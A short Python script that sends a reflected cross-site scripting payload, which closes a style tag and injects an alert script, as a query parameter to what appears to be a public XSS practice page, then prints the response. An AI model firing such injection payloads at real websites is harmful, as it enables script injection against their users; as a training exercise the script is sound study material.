#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

payload = '</style><script>alert(2+1)</script>'

params = {'p03': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
